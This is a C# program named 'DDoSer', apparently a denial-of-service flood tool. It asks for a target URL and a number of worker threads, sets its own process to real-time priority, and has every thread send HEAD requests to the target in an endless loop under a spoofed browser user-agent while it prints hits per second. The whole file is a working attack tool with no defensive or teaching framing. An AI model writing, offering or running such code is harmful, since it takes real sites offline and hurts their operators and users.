using System;
using System.Diagnostics;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace DDoSer
{
    public class Program
    {
        private static int count = 0;
        private static int countElapsed = 0;
        private static int speed = 0;
        private static readonly int timerInterval = 1000;


        private static void Main()
        {
            System.Timers.Timer timer = new()
            {
                Interval = timerInterval
            };
            timer.Elapsed += OnTimedEvent;
            timer.AutoReset = true;

            Console.Write("URL name of TARGET (Example https://www.google.com/): ");
            string url = Console.ReadLine();
            string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3";

            Console.Write("Workers count: ");
            int numOfThreads = Convert.ToInt32(Console.ReadLine());

            using (Process p = Process.GetCurrentProcess())
            {
                p.PriorityClass = ProcessPriorityClass.RealTime;
            }
            
            HttpClient httpClient = new();

            Thread[] threads = new Thread[numOfThreads];

            Parallel.For(0, numOfThreads, (i) =>
            {
                threads[i] =
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            using (HttpRequestMessage request = new(HttpMethod.Head, url))
                            {
                                request.Headers.Add("User-Agent", userAgent);
                                HttpResponseMessage response = httpClient.Send(request, CancellationToken.None);
                                response.EnsureSuccessStatusCode();
                                Interlocked.Increment(ref count);
                            }
                            Console.WriteLine($"Hitted: {count}\tSpeed: {speed}/sec");
                        }
                        catch (Exception e)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(e.Message);
                            Console.ResetColor();
                        }
                    }
                });
            });

            timer.Enabled = true;

            Parallel.ForEach(threads, (i) =>
            {
                i.Start();
            });
        }

        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            speed = count - countElapsed;
            countElapsed = count;
        }
    }
}
